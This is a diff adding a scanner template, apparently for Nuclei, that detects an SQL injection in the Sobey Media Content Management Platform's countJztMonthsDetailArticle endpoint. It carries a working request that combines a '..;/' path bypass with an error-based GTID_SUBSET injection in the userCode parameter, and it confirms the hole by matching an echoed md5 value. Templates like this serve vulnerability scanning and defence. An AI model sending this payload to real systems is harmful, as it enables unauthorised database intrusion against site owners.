@@ -1,0 +1,31 @@
+id: sobey-imcmp-countjztmonthsdetailarticle-sqli
+
+info:
+  name: Sobey Media Content Management Platform SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Sobey Media Content Management Platform countJztMonthsDetailArticle endpoint is vulnerable to SQL Injection.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztMonthsDetailArticle?siteCode=&token=&userCode=admin&channelId=1&isRenYuan=1&userCode=1'+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,md5({{t1}})))),0x7e),1709)+and+'1'='1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "Sobey"
+          - ".countJztMonthsDetailArticle"
+          - "~{{t2}}~"
+          - "java.sql.SQLException"
+        part: body
